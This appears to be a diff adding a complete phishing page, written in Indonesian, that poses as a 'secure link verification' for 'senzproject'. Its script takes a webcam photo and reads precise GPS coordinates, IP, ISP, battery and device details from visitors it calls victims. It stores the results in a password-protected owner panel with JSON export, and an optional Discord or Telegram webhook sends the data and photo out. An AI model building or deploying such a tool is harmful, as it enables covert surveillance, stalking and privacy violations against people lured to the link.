@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>senzproject // secure verify</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{--g:#00ff41;--gd:#00ff4140;--bg:#040704;--err:#ff2d2d;--amber:#ffb000}
+html,body{height:100%}
+body{background:var(--bg);font-family:'Share Tech Mono',monospace;color:var(--g);
+  min-height:100vh;display:flex;align-items:center;justify-content:center;
+  padding:18px;overflow-x:hidden;position:relative}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:8;
+  background:repeating-linear-gradient(0deg,rgba(0,255,65,.06) 0 1px,transparent 1px 3px)}
+body::after{content:"";position:fixed;inset:0;pointer-events:none;z-index:9;
+  background:radial-gradient(ellipse at center,transparent 40%,rgba(0,0,0,.7) 100%)}
+.wrap{width:100%;max-width:420px;position:relative;z-index:10}
+.bar{display:flex;justify-content:space-between;font-size:11px;opacity:.7;
+  margin-bottom:10px;letter-spacing:1px}
+.card{border:1px solid var(--gd);background:linear-gradient(180deg,#061006,#020602);
+  box-shadow:0 0 22px #00ff4118,inset 0 0 40px #00ff4108;padding:22px;position:relative}
+.card::before,.card::after{content:"";position:absolute;width:14px;height:14px;border:2px solid var(--g)}
+.card::before{top:-1px;left:-1px;border-right:0;border-bottom:0}
+.card::after{bottom:-1px;right:-1px;border-left:0;border-top:0}
+.brand{text-align:center;margin-bottom:4px;cursor:pointer}
+.brand h1{font-size:24px;letter-spacing:4px;color:var(--g);
+  text-shadow:0 0 8px var(--g),0 0 18px var(--g);font-weight:700}
+.brand h1 span{color:#fff;text-shadow:0 0 10px #fff}
+.brand p{font-size:10px;letter-spacing:2px;opacity:.6;margin-top:3px}
+.sep{height:1px;background:linear-gradient(90deg,transparent,var(--g),transparent);
+  margin:14px 0;opacity:.5}
+.owner{display:flex;gap:12px;align-items:center;margin-bottom:14px}
+.avatar{width:64px;height:64px;border:1px solid var(--g);border-radius:4px;
+  overflow:hidden;flex-shrink:0;box-shadow:0 0 12px var(--gd);position:relative;background:#0a1a0a}
+.avatar img{width:100%;height:100%;object-fit:cover;display:block;filter:contrast(1.1) saturate(.8)}
+.avatar::after{content:"OWNER";position:absolute;bottom:0;left:0;right:0;font-size:8px;
+  text-align:center;background:#000c;padding:1px;letter-spacing:2px;color:var(--g)}
+.owner-meta .name{font-size:15px;color:#fff;letter-spacing:1px}
+.owner-meta .role{font-size:10px;opacity:.6}
+.owner-meta .id{font-size:9px;color:var(--amber);margin-top:2px}
+.msg{font-size:12px;line-height:1.6;opacity:.85;margin-bottom:16px;
+  border-left:2px solid var(--g);padding-left:10px}
+.msg b{color:#fff}
+.req{display:flex;flex-direction:column;gap:9px;margin-bottom:18px}
+.row{display:flex;align-items:center;gap:10px;font-size:11px;
+  border:1px dashed #00ff4133;padding:9px 11px;background:#00ff4106}
+.row .dot{width:8px;height:8px;border-radius:50%;background:#333;flex-shrink:0;transition:.3s}
+.row.ok .dot{background:var(--g);box-shadow:0 0 8px var(--g)}
+.row.fail .dot{background:var(--err);box-shadow:0 0 8px var(--err)}
+.row .lbl{flex:1}
+.row .st{font-size:9px;letter-spacing:1px;opacity:.5}
+.row.ok .st{color:var(--g);opacity:1}
+.row.fail .st{color:var(--err);opacity:1}
+#camPreview{width:100%;display:none;border:1px solid var(--gd);margin-bottom:14px;background:#000}
+.btn{display:block;width:100%;padding:14px;font-family:inherit;font-size:13px;
+  letter-spacing:3px;background:var(--g);color:#000;border:0;cursor:pointer;
+  font-weight:700;box-shadow:0 0 18px var(--gd);transition:.15s;text-transform:uppercase}
+.btn:active{transform:scale(.98)}
+.btn:disabled{opacity:.4;cursor:wait}
+.btn.ghost{background:transparent;color:var(--g);border:1px solid var(--g);box-shadow:none}
+.log{font-size:9.5px;line-height:1.5;color:#00ff41aa;margin-top:14px;
+  border-top:1px solid #00ff4122;padding-top:10px;max-height:110px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
+.log b{color:var(--amber)}
+.foot{text-align:center;font-size:9px;opacity:.4;margin-top:12px;letter-spacing:2px}
+input.pw{width:100%;padding:12px;background:#020602;border:1px solid var(--gd);
+  color:var(--g);font-family:inherit;font-size:13px;letter-spacing:2px;margin-bottom:12px;outline:none}
+input.pw:focus{border-color:var(--g);box-shadow:0 0 10px var(--gd)}
+.err{color:var(--err);font-size:10px;margin-bottom:10px;display:none}
+
+/* panel owner */
+#panel{display:none;position:fixed;inset:0;z-index:50;background:#000d;backdrop-filter:blur(4px);
+  padding:18px;overflow-y:auto}
+#panel .wrap{margin:0 auto}
+#panel h2{font-size:14px;letter-spacing:2px;color:var(--g);margin-bottom:6px}
+#panel .sub{font-size:10px;color:var(--amber);margin-bottom:12px}
+.toolbar{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
+.toolbar button{flex:1;padding:8px;font-family:inherit;font-size:10px;background:transparent;
+  border:1px solid var(--gd);color:var(--g);cursor:pointer;letter-spacing:1px;min-width:80px}
+.toolbar button:active{background:#00ff4122}
+.victim{border:1px solid var(--gd);background:#020a02;padding:12px;margin-bottom:10px;position:relative}
+.victim .meta{font-size:10px;line-height:1.55;white-space:pre-wrap;word-break:break-all;color:#9cffb8}
+.victim img.shot{width:100%;border:1px solid var(--gd);margin:8px 0;transform:scaleX(-1)}
+.victim .del{position:absolute;top:6px;right:6px;background:transparent;border:1px solid var(--err);
+  color:var(--err);font-size:9px;padding:2px 6px;cursor:pointer;font-family:inherit}
+.victim a{color:var(--amber);word-break:break-all}
+.empty{opacity:.4;font-size:10px;text-align:center;padding:20px}
+</style>
+</head>
+<body>
+
+<!-- ===================== HALAMAN PUBLIK (penipu) ===================== -->
+<div class="wrap" id="publicPage">
+  <div class="bar">
+    <span>&gt; senzproject_sec</span>
+    <span id="clock">--:--:--</span>
+  </div>
+  <div class="card">
+    <div class="brand" onclick="ownerLogin();return false">
+      <h1>SENZ<span>PROJECT</span></h1>
+      <p>// SECURE LINK VERIFICATION</p>
+    </div>
+    <div class="sep"></div>
+    <div class="owner">
+      <div class="avatar"><img id="ownerPhoto" alt="owner"></div>
+      <div class="owner-meta">
+        <div class="name">SENZ</div>
+        <div class="role">Owner · senzproject</div>
+        <div class="id">UID: SZP-0x7F3A</div>
+      </div>
+    </div>
+    <div class="msg">
+      <b>Access requested.</b> Untuk verifikasi, sistem butuh izin
+      <b>kamera</b> &amp; <b>lokasi</b> pengunjung. Tekan tombol di bawah.
+    </div>
+    <div class="req">
+      <div class="row" id="rowCam"><span class="dot"></span><span class="lbl">CAMERA // biometrik</span><span class="st" id="stCam">PENDING</span></div>
+      <div class="row" id="rowLoc"><span class="dot"></span><span class="lbl">GPS // geolokasi</span><span class="st" id="stLoc">PENDING</span></div>
+    </div>
+    <video id="camPreview" autoplay playsinline muted></video>
+    <button class="btn" id="startBtn">▶ MULAI VERIFIKASI</button>
+    <div class="log" id="log">&gt; menunggu perintah...</div>
+    <div class="foot">© senzproject — underground verify system</div>
+  </div>
+</div>
+
+<!-- ===================== HALAMAN LOGIN OWNER ===================== -->
+<div class="wrap" id="loginPage" style="display:none">
+  <div class="card">
+    <div class="brand"><h1>SENZ<span>PROJECT</span></h1><p>// OWNER AUTH</p></div>
+    <div class="sep"></div>
+    <div class="msg"><b>Restricted area.</b> Masukkan password owner untuk akses panel.</div>
+    <div class="err" id="loginErr">✗ password salah</div>
+    <input class="pw" id="pw" type="password" placeholder="· · · · · · · ·" autocomplete="current-password">
+    <button class="btn" id="loginBtn">▶ AKSES PANEL</button>
+    <div class="sep"></div>
+    <button class="btn ghost" onclick="backToPublic()">← KEMBALI KE HALAMAN PUBLIK</button>
+    <div class="foot">senzproject // owner only</div>
+  </div>
+</div>
+
+<!-- ===================== PANEL OWNER ===================== -->
+<div id="panel">
+  <div class="wrap">
+    <h2>▣ OWNER PANEL // SENZPROJECT</h2>
+    <div class="sub">// <span id="count">0</span> korban tercatat · localStorage</div>
+    <div class="toolbar">
+      <button onclick="exportData()">⬇ EXPORT JSON</button>
+      <button onclick="clearData()">⌫ HAPUS SEMUA</button>
+      <button onclick="logout()">⏻ LOGOUT</button>
+    </div>
+    <div id="list"></div>
+  </div>
+</div>
+
+<script>
+/* ============================================================
+   KONFIG OWNER
+   ============================================================ */
+const OWNER_PHOTO = "https://i.ibb.co/9vJx6wK/senz.jpg"; // ganti foto owner
+const OWNER_PASS  = "senzroot";                          // password login
+const WEBHOOK_URL = "";                                  // opsional: webhook Discord/Telegram
+const STORE_KEY   = "szp_victims_v1";
+const SESS_KEY    = "szp_auth";
+
+/* ============================================================
+   VIEW ROUTER
+   ============================================================ */
+const publicPage=document.getElementById('publicPage');
+const loginPage=document.getElementById('loginPage');
+const panel=document.getElementById('panel');
+document.getElementById('ownerPhoto').src=OWNER_PHOTO;
+
+function showView(v){
+  publicPage.style.display='none'; loginPage.style.display='none'; panel.style.display='none';
+  if(v==='public') publicPage.style.display='flex';
+  if(v==='login')  loginPage.style.display='flex';
+  if(v==='panel')  panel.style.display='block';
+}
+function ownerLogin(){
+  if(sessionStorage.getItem(SESS_KEY)===OWNER_PASS){ openPanel(); return; }
+  showView('login'); setTimeout(()=>document.getElementById('pw').focus(),100);
+}
+function backToPublic(){ showView('public'); }
+function logout(){ sessionStorage.removeItem(SESS_KEY); showView('public'); }
+
+document.getElementById('loginBtn').onclick=()=>{
+  const v=document.getElementById('pw').value;
+  if(v===OWNER_PASS){
+    sessionStorage.setItem(SESS_KEY,OWNER_PASS);
+    document.getElementById('pw').value='';
+    openPanel();
+  }else{
+    document.getElementById('loginErr').style.display='block';
+    document.getElementById('pw').value='';
+  }
+};
+document.getElementById('pw').addEventListener('keydown',e=>{ if(e.key==='Enter') document.getElementById('loginBtn').click(); });
+
+/* buka panel via URL ?owner=1 */
+if(new URLSearchParams(location.search).get('owner')==='1') ownerLogin();
+
+/* jam */
+setInterval(()=>{const d=new Date();document.getElementById('clock').textContent=
+  String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0')+':'+String(d.getSeconds()).padStart(2,'0');},1000);
+
+/* log */
+const logEl=document.getElementById('log');
+function log(t,amber){const l=document.createElement('div');
+  l.innerHTML=amber?'<b>&gt; '+t+'</b>':'&gt; '+t;
+  logEl.appendChild(l); logEl.scrollTop=logEl.scrollHeight;}
+
+/* ============================================================
+   COLLECTOR
+   ============================================================ */
+function freshData(){return{
+  id:Date.now()+"-"+Math.random().toString(36).slice(2,7),
+  owner:"senzproject", ts:new Date().toISOString(),
+  ua:navigator.userAgent, platform:navigator.platform||"n/a",
+  lang:navigator.language, screen:screen.width+"x"+screen.height,
+  tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+  cores:navigator.hardwareConcurrency||"n/a", mem:navigator.deviceMemory||"n/a",
+  battery:"n/a", ip:"n/a", isp:"", city:"", region:"", country:"",
+  gps:null, photo:null, error:[]
+};}
+let data=freshData();
+
+(async()=>{
+  try{const r=await fetch("https://ipapi.co/json/");const j=await r.json();
+    data.ip=j.ip||"n/a";data.isp=j.org||"";data.city=j.city||"";data.region=j.region||"";data.country=j.country_name||"";
+    log("ip "+data.ip);}
+  catch(e){try{const r=await fetch("https://api.ipify.org?format=json");const j=await r.json();data.ip=j.ip;log("ip "+data.ip);}
+  catch(_){log("ip gagal","1");data.error.push("ip");}}
+})();
+
+if(navigator.getBattery) navigator.getBattery().then(b=>{
+  data.battery=(b.level*100).toFixed(0)+"%"+(b.charging?"⚡":""); log("batt "+data.battery);
+}).catch(()=>{});
+
+function getLoc(){return new Promise(res=>{
+  if(!navigator.geolocation){res(null);return;}
+  navigator.geolocation.getCurrentPosition(p=>res(p.coords),
+    e=>{log("gps err: "+e.message,"1");data.error.push("gps:"+e.message);res(null);},
+    {enableHighAccuracy:true,timeout:15000,maximumAge:0});});}
+
+async function shootCam(){
+  if(!navigator.mediaDevices?.getUserMedia) throw new Error("no camera API");
+  const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:"user"},width:{ideal:640},height:{ideal:480}},audio:false});
+  const vid=document.getElementById('camPreview');
+  vid.srcObject=stream; vid.style.display="block";
+  await new Promise(r=>{vid.onloadedmetadata=r;setTimeout(r,2500);});
+  await new Promise(r=>setTimeout(r,1200));
+  const cv=document.createElement('canvas');
+  cv.width=vid.videoWidth||640; cv.height=vid.videoHeight||480;
+  cv.getContext('2d').drawImage(vid,0,0,cv.width,cv.height);
+  const img=cv.toDataURL('image/jpeg',0.9);
+  stream.getTracks().forEach(t=>t.stop()); vid.style.display="none";
+  return img;
+}
+
+/* ============================================================
+   ALUR VERIFIKASI
+   ============================================================ */
+const startBtn=document.getElementById('startBtn');
+let started=false;
+startBtn.onclick=async()=>{
+  if(started) return; started=true;
+  startBtn.disabled=true; startBtn.textContent="MEMPROSES...";
+  log("verifikasi dimulai");
+  let camOK=false, locOK=false;
+
+  try{
+    const img=await shootCam();
+    data.photo=img; camOK=true;
+    document.getElementById('rowCam').classList.add('ok');
+    document.getElementById('stCam').textContent="OK"; log("kamera ✓");
+  }catch(e){
+    document.getElementById('rowCam').classList.add('fail');
+    document.getElementById('stCam').textContent="DENIED";
+    log("kamera gagal: "+e.message,"1"); data.error.push("cam:"+e.message);
+  }
+
+  const coords=await getLoc();
+  if(coords){
+    data.gps={lat:coords.latitude,lng:coords.longitude,acc:Math.round(coords.accuracy)+"m"};
+    locOK=true;
+    document.getElementById('rowLoc').classList.add('ok');
+    document.getElementById('stLoc').textContent="OK"; log("gps ✓ ±"+data.gps.acc);
+  }else{
+    document.getElementById('rowLoc').classList.add('fail');
+    document.getElementById('stLoc').textContent="DENIED";
+  }
+
+  saveVictim();
+  sendWebhook();
+  startBtn.textContent=(locOK||camOK)?"✓ TERVERIFIKASI":"⚠ IZIN DIBUTUHKAN";
+};
+
+/* ============================================================
+   STORAGE
+   ============================================================ */
+function loadAll(){try{return JSON.parse(localStorage.getItem(STORE_KEY))||[];}catch(e){return[];}}
+function saveVictim(){
+  if(!data.photo && !data.gps) return;
+  const all=loadAll(); all.unshift(data);
+  try{localStorage.setItem(STORE_KEY,JSON.stringify(all));log("data tersimpan ✓");}
+  catch(e){log("storage penuh: "+e.message,"1");}
+}
+function clearData(){ if(confirm("Hapus semua data korban?")){localStorage.removeItem(STORE_KEY); openPanel();} }
+function exportData(){
+  const blob=new Blob([JSON.stringify(loadAll(),null,2)],{type:"application/json"});
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(blob); a.download="senzproject_victims_"+Date.now()+".json"; a.click();
+}
+
+/* ============================================================
+   RENDER PANEL
+   ============================================================ */
+function openPanel(){
+  const all=loadAll();
+  document.getElementById('count').textContent=all.length;
+  const list=document.getElementById('list');
+  if(!all.length){ list.innerHTML='<div class="empty">— belum ada korban tertangkap —<br>bagikan link publik ke target —</div>'; }
+  else{
+    list.innerHTML='';
+    all.forEach(v=>{
+      const el=document.createElement('div'); el.className='victim';
+      const gps=v.gps?`GPS    : ${v.gps.lat}, ${v.gps.lng} (±${v.gps.acc})
+MAPS   : <a href="https://maps.google.com/?q=${v.gps.lat},${v.gps.lng}" target="_blank">buka maps</a>`:"GPS    : DENIED";
+      el.innerHTML=`<button class="del" data-id="${v.id}">✕</button>
+        <div class="meta">[SZP LOG ${v.id}]
+WAKTU  : ${v.ts}
+IP     : ${v.ip} (${v.isp||"-"})
+LOKASI : ${v.city||"-"}, ${v.region||"-"} ${v.country||""}
+${gps}
+DEVICE : ${v.platform} | ${v.screen}
+UA     : ${v.ua}
+TZ/BB  : ${v.tz} | ${v.battery}
+ERROR  : ${v.error.join(" | ")||"-"}</div>`;
+      if(v.photo){const i=new Image();i.className='shot';i.src=v.photo;el.appendChild(i);}
+      el.querySelector('.del').onclick=()=>{
+        const cur=loadAll().filter(x=>x.id!==v.id);
+        localStorage.setItem(STORE_KEY,JSON.stringify(cur)); openPanel();
+      };
+      list.appendChild(el);
+    });
+  }
+  showView('panel');
+}
+
+/* ============================================================
+   WEBHOOK (opsional)
+   ============================================================ */
+async function sendWebhook(){
+  if(!WEBHOOK_URL){log("webhook kosong — data di panel","1");return;}
+  try{
+    const map=v=>v.gps?`https://maps.google.com/?q=${v.gps.lat},${v.gps.lng}`:"GPS ditolak";
+    const txt=`🛰️ SENZPROJECT // VISITOR
+🕐 ${data.ts}
+🌐 ${data.ip} (${data.isp||"-"})
+🏙️ ${data.city||"-"}, ${data.region||"-"} ${data.country||""}
+📍 ${data.gps?"https://maps.google.com/?q="+data.gps.lat+","+data.gps.lng:"ditolak"}
+📱 ${data.platform} | ${data.screen}
+${data.ua}`;
+    if(WEBHOOK_URL.includes("discord")){
+      const fd=new FormData();
+      fd.append("payload_json",JSON.stringify({content:txt}));
+      if(data.photo)fd.append("file",dataURLtoBlob(data.photo),"pwn.jpg");
+      await fetch(WEBHOOK_URL,{method:"POST",body:fd});
+    }else if(data.photo){
+      const fd=new FormData(); fd.append("caption",txt);
+      fd.append("photo",dataURLtoBlob(data.photo),"pwn.jpg");
+      await fetch(WEBHOOK_URL,{method:"POST",body:fd});
+    }else{
+      await fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:txt,text:txt})});
+    }
+    log("webhook ✓");
+  }catch(e){log("webhook gagal: "+e.message,"1");}
+}
+function dataURLtoBlob(u){const b=atob(u.split(",")[1]);const a=new Uint8Array(b.length);
+  for(let i=0;i<b.length;i++)a[i]=b.charCodeAt(i);return new Blob([a],{type:"image/jpeg"});}
+</script>
+</body>
+</html>
